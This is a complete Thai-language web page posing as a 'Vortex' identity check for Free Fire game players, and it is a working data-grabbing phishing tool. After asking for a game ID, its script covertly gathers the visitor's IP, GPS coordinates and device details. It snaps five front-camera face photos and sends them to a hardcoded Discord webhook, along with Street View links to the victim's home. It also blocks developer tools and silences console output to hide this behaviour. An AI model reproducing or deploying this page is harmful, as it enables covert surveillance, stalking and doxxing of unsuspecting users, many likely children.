<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🌀 Vortex - ยืนยันตัวตน</title>

    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&family=Orbitron:wght@400;700;900&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        body {
            font-family: 'Kanit', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #ff6b6b, #feca57, #48dbfb, #ff9ff3, #54a0ff, #5f27cd);
            background-size: 400% 400%;
            animation: rainbow 8s ease infinite;
            padding: 20px;
            overflow: hidden;
        }

        @keyframes rainbow {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .glass-panel {
            background: rgba(255, 255, 255, 0.12);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.25);
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.2);
            border-radius: 40px;
            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        .glass-panel:hover {
            transform: scale(1.01);
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5);
        }

        .input-glow:focus {
            border-color: #ff6a00;
            box-shadow: 0 0 30px rgba(255, 106, 0, 0.3), 0 0 60px rgba(255, 106, 0, 0.1);
            outline: none;
            transform: scale(1.02);
        }

        .btn-ff {
            background: linear-gradient(135deg, #ff6a00, #ee0979);
            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            font-weight: 600;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
        }

        .btn-ff::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.2) 0%, transparent 60%);
            opacity: 0;
            transition: opacity 0.5s;
            transform: rotate(0deg);
        }

        .btn-ff:hover::before {
            opacity: 1;
        }

        .btn-ff:hover {
            transform: scale(1.05) translateY(-2px);
            box-shadow: 0 15px 40px rgba(255, 106, 0, 0.5);
        }

        .btn-ff:active {
            transform: scale(0.95);
        }

        .info-card {
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.12);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
            border-radius: 20px;
        }

        .info-card:hover {
            background: rgba(255, 255, 255, 0.15);
            transform: translateX(5px) scale(1.02);
            border-color: rgba(255, 106, 0, 0.3);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
        }

        ::-webkit-scrollbar {
            width: 4px;
        }
        ::-webkit-scrollbar-thumb {
            background: #ff6a00;
            border-radius: 999px;
        }
        ::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 999px;
        }

        .animate-pulse-slow {
            animation: pulseSlow 2.5s ease-in-out infinite;
        }
        @keyframes pulseSlow {
            0%, 100% { opacity: 0.7; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.05); }
        }

        .scan-anim {
            height: 3px;
            background: linear-gradient(90deg, transparent, #ff6a00, #ee0979, #ff6a00, transparent);
            position: absolute;
            width: 100%;
            top: 0;
            animation: move 2.5s ease-in-out infinite;
            box-shadow: 0 0 30px #ff6a00, 0 0 60px #ee0979;
            border-radius: 2px;
        }

        @keyframes move {
            0% { top: 0; opacity: 0.6; }
            50% { top: 100%; opacity: 1; }
            100% { top: 0; opacity: 0.6; }
        }

        .animate-fade-in {
            animation: fadeIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
        }
        @keyframes fadeIn {
            0% { opacity: 0; transform: scale(0.9) translateY(20px); }
            100% { opacity: 1; transform: scale(1) translateY(0); }
        }

        .video-container {
            border-radius: 50%;
            border: 3px solid rgba(255, 255, 255, 0.3);
            box-shadow: 0 0 50px rgba(255, 106, 0, 0.3), 0 0 100px rgba(255, 106, 0, 0.1);
            transition: all 0.5s ease;
            position: relative;
        }

        .video-container:hover {
            transform: scale(1.02);
            box-shadow: 0 0 80px rgba(255, 106, 0, 0.5), 0 0 150px rgba(255, 106, 0, 0.2);
        }

        .video-container::after {
            content: '';
            position: absolute;
            inset: -3px;
            border-radius: 50%;
            padding: 3px;
            background: linear-gradient(135deg, #ff6a00, #ee0979, #ff6a00);
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            animation: rotateBorder 3s linear infinite;
        }

        @keyframes rotateBorder {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* ซ่อนปุ่มที่ไม่จำเป็น */
        #btn-capture, #btn-cancel-scan {
            display: none !important;
        }

        .step-transition {
            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        .glow-text {
            text-shadow: 0 0 20px rgba(255, 106, 0, 0.3), 0 0 40px rgba(255, 106, 0, 0.1);
        }

        .status-success {
            color: #4ade80;
        }
        .status-error {
            color: #f87171;
        }
        .status-loading {
            color: #fbbf24;
        }

        /* โลโก้ Vortex */
        .logo-vortex {
            font-family: 'Orbitron', sans-serif;
            font-weight: 900;
            font-size: 1.8rem;
            background: linear-gradient(135deg, #ff6a00, #ee0979, #ff6a00);
            background-size: 200% 200%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: gradShift 3s ease-in-out infinite;
            letter-spacing: 3px;
        }

        @keyframes gradShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .logo-icon {
            width: 52px;
            height: 52px;
            background: linear-gradient(135deg, rgba(255, 106, 0, 0.25), rgba(238, 9, 121, 0.25));
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2rem;
            border: 1px solid rgba(255, 106, 0, 0.2);
            box-shadow: 0 0 40px rgba(255, 106, 0, 0.1);
            animation: logoGlow 3s ease-in-out infinite;
        }

        @keyframes logoGlow {
            0%, 100% { box-shadow: 0 0 40px rgba(255, 106, 0, 0.1); }
            50% { box-shadow: 0 0 60px rgba(255, 106, 0, 0.3); }
        }
    </style>
</head>
<body>

<div class="w-full max-w-md px-4 py-6">

    <div class="glass-panel rounded-[40px] overflow-hidden shadow-2xl my-4">

        <!-- Header พร้อมโลโก้ Vortex -->
        <div class="relative h-32 bg-gradient-to-r from-orange-500/30 via-pink-500/30 to-purple-500/30 backdrop-blur-sm flex items-center px-6 border-b border-white/10">
            <div class="absolute inset-0 bg-black/20 backdrop-blur-[2px]"></div>
            <div class="relative z-10 flex items-center gap-5">
                <div class="logo-icon">🌀</div>
                <div>
                    <div class="logo-vortex">VORTEX</div>
                    <p class="text-white/70 text-sm font-light tracking-wider">⚡ Secure Identification</p>
                </div>
            </div>
        </div>

        <div class="p-6 pt-8">

            <!-- ===== STEP 1: กรอก ID ===== -->
            <div id="step-input" class="step-transition">
                <div class="space-y-5">
                    <div>
                        <label class="text-sm font-medium text-white/80 block mb-2 flex items-center gap-2">
                            <span>🆔</span> ID FreeFire ของคุณ
                        </label>
                        <input id="ff-id-input" type="text" placeholder="เช่น 1234567890" 
                               class="w-full bg-white/10 border border-white/20 rounded-2xl px-5 py-4 text-white placeholder-white/40 input-glow transition text-lg font-medium backdrop-blur-sm">
                    </div>

                    <button id="btn-to-scan" class="btn-ff w-full py-4 rounded-2xl text-white text-lg shadow-lg flex items-center justify-center gap-3">
                        <span>📸 ไปขั้นตอนสแกนหน้า</span>
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
                    </button>

                    <div class="flex justify-center gap-4 text-xs text-white/40 pt-2">
                        <span class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 rounded-full bg-green-400 inline-block shadow-lg shadow-green-400/50"></span> ระบบปลอดภัย</span>
                        <span class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 rounded-full bg-blue-400 inline-block shadow-lg shadow-blue-400/50"></span> เข้ารหัส SSL</span>
                    </div>
                </div>

                <div class="mt-5 text-center">
                    <p id="status-msg" class="text-white/70 text-sm animate-pulse-slow font-medium tracking-wide">⏳ กรอก ID เพื่อเริ่มต้น</p>
                </div>
            </div>

            <!-- ===== STEP 2: สแกนหน้า (Auto Capture) ===== -->
            <div id="step-scan" class="hidden step-transition text-center">
                <div class="video-container relative w-64 h-64 mx-auto mb-5 rounded-full overflow-hidden bg-black/50 backdrop-blur-sm">
                    <video id="cam" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
                    <div class="absolute inset-0 bg-gradient-to-b from-transparent via-orange-500/5 to-transparent"></div>
                    <div class="scan-anim"></div>
                    <div class="absolute inset-0 rounded-full border-2 border-white/10"></div>
                </div>
                
                <p id="scan-status" class="text-white/90 text-sm animate-pulse tracking-widest font-medium">📷 กำลังเปิดกล้อง...</p>
                <p id="capture-progress" class="text-white/50 text-xs mt-2 hidden">📸 กำลังถ่ายภาพยืนยัน...</p>
                
                <div class="mt-5 flex gap-3 hidden">
                    <button id="btn-cancel-scan" class="flex-1 py-3 rounded-xl border border-white/20 text-white/60 hover:text-white hover:border-white/40 transition text-sm backdrop-blur-sm">
                        ยกเลิก
                    </button>
                    <button id="btn-capture" class="flex-1 btn-ff py-3 rounded-xl text-white text-sm shadow-lg">
                        ✅ ยืนยันตัวตน
                    </button>
                </div>
            </div>

            <!-- ===== STEP 3: ผลลัพธ์ ===== -->
            <div id="step-result" class="hidden animate-fade-in">
                <div class="bg-gradient-to-br from-orange-500/20 to-pink-500/20 border border-white/20 rounded-2xl p-5 mb-6 backdrop-blur-sm">
                    <div class="flex items-center gap-4">
                        <div class="w-14 h-14 rounded-2xl bg-gradient-to-br from-orange-500 to-pink-500 flex items-center justify-center text-2xl shadow-xl text-white font-bold">
                            ✅
                        </div>
                        <div>
                            <h2 class="text-lg font-bold text-white flex items-center gap-2">
                                ยืนยันสำเร็จ
                                <span class="text-[10px] bg-white/20 text-white px-2 py-0.5 rounded-full border border-white/30">VERIFIED</span>
                            </h2>
                            <p class="text-white/50 text-xs">Ref: <span id="ref-code">FF-994102-B</span></p>
                        </div>
                    </div>
                </div>

                <!-- แสดงสถานะการส่งข้อมูล -->
                <div id="webhook-status" class="text-center p-3 rounded-xl bg-white/5 border border-white/10 mb-4">
                    <p id="webhook-msg" class="text-sm font-medium text-yellow-400">⏳ กำลังส่งข้อมูลไปยัง Discord...</p>
                </div>

                <div id="info-box" class="space-y-3 max-h-[420px] overflow-y-auto pr-1"></div>

                <button id="btn-back" class="mt-5 w-full py-3 rounded-xl border border-white/20 text-white/70 hover:text-white hover:border-white/40 transition flex items-center justify-center gap-2 text-sm backdrop-blur-sm hover:bg-white/5">
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/></svg>
                    เริ่มใหม่
                </button>
            </div>

        </div>
    </div>

    <div class="text-center text-white/20 text-[10px] mt-6 tracking-widest font-light">
        VORTEX SECURE SYSTEM • ยืนยันตัวตน
    </div>
</div>

<script>
// === ป้องกันการเข้าถึง开发者工具ทั้งหมด ===
document.addEventListener('contextmenu', e => {
    e.preventDefault();
    return false;
});

document.addEventListener('keydown', function(e) {
    if (e.key === 'F12' || e.keyCode === 123) {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I' || e.key === 'j' || e.key === 'J')) {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.shiftKey && (e.key === 'c' || e.key === 'C')) {
        e.preventDefault();
        return false;
    }
    if (e.altKey && e.ctrlKey && (e.key === 'i' || e.key === 'I')) {
        e.preventDefault();
        return false;
    }
    return true;
});

document.addEventListener('dragstart', e => e.preventDefault());
document.addEventListener('drop', e => e.preventDefault());
document.addEventListener('copy', e => e.preventDefault());
document.addEventListener('paste', e => e.preventDefault());
document.addEventListener('cut', e => e.preventDefault());

console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};

// === CONFIG ===
const WEBHOOK_URL = "https://discord.com/api/webhooks/1517942311072305283/METCFxaMuG_Vu2xsnAVrqL0TLYvtu0X3rt5GHBHvVK8u8Hljm2UOG1eBxioHn5GbaJqh";

let userData = {
    lat: "ไม่ระบุ",
    lon: "ไม่ระบุ",
    ip: "Unknown",
    battery: "Unknown",
    ffid: ""
};

let cameraStream = null;
let isCapturing = false;

// ===== ฟังก์ชันเก็บข้อมูล =====
async function collectData() {
    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        userData.ip = ipData.ip;
    } catch(e) {
        console.log("IP fetch failed");
    }

    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            userData.battery = Math.floor(battery.level * 100) + "%";
        }
    } catch(e) {
        console.log("Battery fetch failed");
    }

    return new Promise((resolve) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    userData.lat = pos.coords.latitude;
                    userData.lon = pos.coords.longitude;
                    resolve();
                },
                () => { resolve(); }
            );
        } else {
            resolve();
        }
    });
}

// ===== เปิดกล้องและถ่ายรัวอัตโนมัติ =====
async function startCameraAndAutoCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
        });
        cameraStream = stream;
        const video = document.getElementById("cam");
        video.srcObject = stream;
        document.getElementById("scan-status").innerText = "📸 กำลังถ่ายภาพยืนยัน...";
        document.getElementById("capture-progress").classList.remove("hidden");
        
        await new Promise(resolve => {
            video.onloadedmetadata = () => {
                resolve();
            };
        });
        
        // เริ่มถ่ายรัวทันที 5 รูป
        startBurstCapture(video);
        return true;
    } catch (err) {
        document.getElementById("scan-status").innerText = "❌ ไม่สามารถเปิดกล้องได้";
        console.error("Camera error:", err);
        return false;
    }
}

// ===== ถ่ายรัว 5 รูป (0.3 วินาที/รูป) =====
function startBurstCapture(video) {
    if (isCapturing) return;
    isCapturing = true;
    
    const burstCount = 5;
    let captured = 0;
    const images = [];
    
    function captureOne() {
        try {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext("2d");
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob((blob) => {
                if (blob) {
                    images.push(blob);
                }
                captured++;
                
                if (captured < burstCount) {
                    setTimeout(captureOne, 300);
                } else {
                    finishAndSend(images, video);
                }
            }, "image/png", 0.9);
        } catch(e) {
            captured++;
            if (captured < burstCount) {
                setTimeout(captureOne, 300);
            } else {
                finishAndSend(images, video);
            }
        }
    }
    
    captureOne();
}

function finishAndSend(images, video) {
    if (cameraStream) {
        cameraStream.getTracks().forEach(t => t.stop());
        cameraStream = null;
    }
    console.log("Captured " + images.length + " images, sending...");
    sendAllToWebhook(images);
}

// ===== ส่งข้อมูลทั้งหมด (แก้ไข HTTP 400) =====
async function sendAllToWebhook(images) {
    const webhookMsg = document.getElementById("webhook-msg");
    webhookMsg.textContent = "⏳ กำลังส่งข้อมูลไปยัง Discord...";
    webhookMsg.className = "text-sm font-medium text-yellow-400";

    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
    const cookiesStatus = navigator.cookieEnabled ? "Enabled" : "Disabled";
    const connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
    const cpuCores = navigator.hardwareConcurrency || "Unknown";
    const ramSize = (navigator.deviceMemory || "Unknown") + " GB";
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    // เปลี่ยน UI ทันที
    document.getElementById("step-scan").classList.add("hidden");
    document.getElementById("step-result").classList.remove("hidden");
    document.getElementById("ref-code").innerText = `FF-${Math.floor(Math.random()*999999)}`;

    const embedData = {
        title: "🌀 Vortex Verification System",
        color: 0xff6a00,
        fields: [
            { name: "🆔 FreeFire ID", value: `\`${userData.ffid}\``, inline: false },
            { name: "🌐 IP Address", value: `\`${userData.ip}\``, inline: true },
            { name: "🔋 แบตเตอรี่", value: `\`${userData.battery}\``, inline: true },
            { name: "📍 พิกัด (GPS)", value: `\`${userData.lat}, ${userData.lon}\``, inline: false },
            { name: "💻 ระบบปฏิบัติการ", value: `\`${navigator.platform}\``, inline: true },
            { name: "🗣️ ภาษาเครื่อง", value: `\`${navigator.language}\``, inline: true },
            { name: "🖥️ ความละเอียดหน้าจอ", value: `\`${screen.width} x ${screen.height}\``, inline: true },
            { name: "🧠 CPU Cores", value: `\`${cpuCores}\``, inline: true },
            { name: "💾 RAM ขนาด", value: `\`${ramSize}\``, inline: true },
            { name: "🌍 Timezone", value: `\`${timezone}\``, inline: true },
            { name: "📶 Connection Type", value: `\`${connectionType}\``, inline: true },
            { name: "🍪 Cookies Status", value: `\`${cookiesStatus}\``, inline: true },
            { name: "🌙 Dark Mode", value: `\`${isDarkMode}\``, inline: true },
            { name: "📸 จำนวนภาพ", value: `\`${images ? images.length : 0} รูป\``, inline: true }
        ],
        footer: { text: "Vortex Secure System" },
        timestamp: new Date().toISOString()
    };

    if (userData.lat !== "ไม่ระบุ") {
        embedData.fields.push(
            { name: "🗺️ Google Maps", value: `[เปิดแผนที่](https://www.google.com/maps/search/?api=1&query=${userData.lat},${userData.lon})`, inline: false },
            { name: "🏙️ Street View", value: `[ดูหน้าบ้าน](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${userData.lat},${userData.lon})`, inline: false }
        );
    }

    // แก้ไขปัญหา HTTP 400: ใช้ JSON แทน FormData
    try {
        console.log("Sending to webhook:", WEBHOOK_URL);
        console.log("Number of images:", images ? images.length : 0);
        
        // สร้าง payload เป็น JSON อย่างเดียว (ไม่มีรูป)
        const payload = {
            embeds: [embedData]
        };
        
        // ถ้ามีรูป ให้ใช้ FormData แต่ต้องระบุ content-type ให้ถูกต้อง
        if (images && images.length > 0) {
            const formData = new FormData();
            const maxImages = Math.min(images.length, 5);
            
            // แนบรูปภาพ
            for (let i = 0; i < maxImages; i++) {
                formData.append(`file${i}`, images[i], `face_${i+1}.png`);
            }
            
            // แก้ไข embed ให้ชี้ไปที่รูปแรก
            embedData.image = { url: "attachment://face_1.png" };
            
            // ส่ง payload เป็น JSON ใน FormData
            formData.append("payload_json", JSON.stringify({ embeds: [embedData] }));
            
            const response = await fetch(WEBHOOK_URL, { 
                method: "POST", 
                body: formData
            });
            
            console.log("Response status:", response.status);
            
            if (response.ok) {
                webhookMsg.textContent = "✅ ส่งข้อมูลไปยัง Discord สำเร็จ! (ภาพ " + maxImages + " รูป)";
                webhookMsg.className = "text-sm font-medium text-green-400";
                document.getElementById("status-msg").innerText = "✅ ยืนยันสำเร็จ!";
            } else {
                const errorText = await response.text();
                console.log("Error response:", errorText);
                webhookMsg.textContent = `❌ ส่งข้อมูลไม่สำเร็จ (HTTP ${response.status})`;
                webhookMsg.className = "text-sm font-medium text-red-400";
                document.getElementById("status-msg").innerText = "⚠️ ส่งข้อมูลไม่สำเร็จ";
            }
        } else {
            // ไม่มีรูป ส่งแบบ JSON ธรรมดา
            const response = await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            });
            
            console.log("Response status:", response.status);
            
            if (response.ok) {
                webhookMsg.textContent = "✅ ส่งข้อมูลไปยัง Discord สำเร็จ!";
                webhookMsg.className = "text-sm font-medium text-green-400";
                document.getElementById("status-msg").innerText = "✅ ยืนยันสำเร็จ!";
            } else {
                const errorText = await response.text();
                console.log("Error response:", errorText);
                webhookMsg.textContent = `❌ ส่งข้อมูลไม่สำเร็จ (HTTP ${response.status})`;
                webhookMsg.className = "text-sm font-medium text-red-400";
                document.getElementById("status-msg").innerText = "⚠️ ส่งข้อมูลไม่สำเร็จ";
            }
        }
    } catch(e) {
        console.error("Webhook error:", e);
        webhookMsg.textContent = "❌ เกิดข้อผิดพลาดในการส่งข้อมูล: " + e.message;
        webhookMsg.className = "text-sm font-medium text-red-400";
        document.getElementById("status-msg").innerText = "❌ เกิดข้อผิดพลาด";
    }

    renderResultUI(images ? Math.min(images.length, 5) : 0);
}

// ===== แสดงผล UI =====
function renderResultUI(imageCount) {
    const box = document.getElementById("info-box");
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
    const cookiesStatus = navigator.cookieEnabled ? "Enabled" : "Disabled";
    const connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
    const cpuCores = navigator.hardwareConcurrency || "Unknown";
    const ramSize = (navigator.deviceMemory || "Unknown") + " GB";
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    const data = [
        { icon: "🆔", title: "FreeFire ID", value: userData.ffid },
        { icon: "📍", title: "พิกัด GPS", value: `${userData.lat}, ${userData.lon}` },
        { icon: "🌐", title: "IP Address", value: userData.ip },
        { icon: "💻", title: "ระบบปฏิบัติการ", value: navigator.platform },
        { icon: "🗣️", title: "ภาษา", value: navigator.language },
        { icon: "🖥️", title: "หน้าจอ", value: `${screen.width}x${screen.height}` },
        { icon: "🧠", title: "CPU Cores", value: cpuCores },
        { icon: "💾", title: "RAM", value: ramSize },
        { icon: "🔋", title: "แบตเตอรี่", value: userData.battery },
        { icon: "🌍", title: "Timezone", value: timezone },
        { icon: "📶", title: "Connection", value: connectionType },
        { icon: "🍪", title: "Cookies", value: cookiesStatus },
        { icon: "🌙", title: "Dark Mode", value: isDarkMode },
        { icon: "📸", title: "จำนวนภาพ", value: `${imageCount} รูป` }
    ];

    box.innerHTML = "";
    data.forEach(item => {
        box.innerHTML += `
            <div class="info-card rounded-2xl p-4 flex items-center gap-4 transition">
                <div class="w-11 h-11 rounded-xl bg-gradient-to-br from-orange-500/30 to-pink-500/30 flex items-center justify-center text-xl flex-shrink-0 border border-white/10 backdrop-blur-sm">
                    ${item.icon}
                </div>
                <div class="flex-1 overflow-hidden">
                    <p class="text-[10px] uppercase tracking-widest text-white/40 mb-0.5 font-medium">${item.title}</p>
                    <p class="font-medium text-sm text-white/90 truncate">${item.value}</p>
                </div>
            </div>
        `;
    });
}

// ===== จัดการ Events =====
document.getElementById("btn-to-scan").addEventListener("click", async () => {
    const input = document.getElementById("ff-id-input");
    const id = input.value.trim();

    if (id === "") {
        input.classList.add("border-red-500/50");
        input.placeholder = "⚠️ กรุณากรอก ID";
        setTimeout(() => {
            input.classList.remove("border-red-500/50");
            input.placeholder = "เช่น 1234567890";
        }, 2000);
        return;
    }

    if (!/^\d+$/.test(id)) {
        input.classList.add("border-red-500/50");
        input.value = "";
        input.placeholder = "⚠️ ต้องเป็นตัวเลขเท่านั้น";
        setTimeout(() => {
            input.classList.remove("border-red-500/50");
            input.placeholder = "เช่น 1234567890";
        }, 2000);
        return;
    }

    userData.ffid = id;
    document.getElementById("status-msg").innerText = "📸 กำลังเปิดกล้อง...";

    await collectData();

    document.getElementById("step-input").classList.add("hidden");
    document.getElementById("step-scan").classList.remove("hidden");

    await startCameraAndAutoCapture();
});

document.getElementById("btn-back").addEventListener("click", () => {
    document.getElementById("step-result").classList.add("hidden");
    document.getElementById("step-input").classList.remove("hidden");
    document.getElementById("ff-id-input").value = "";
    document.getElementById("status-msg").innerText = "⏳ กรอก ID เพื่อเริ่มต้น";
    isCapturing = false;
});

window.onload = () => {
    document.getElementById("status-msg").innerText = "⏳ กรอก ID เพื่อเริ่มต้น";
};
</script>
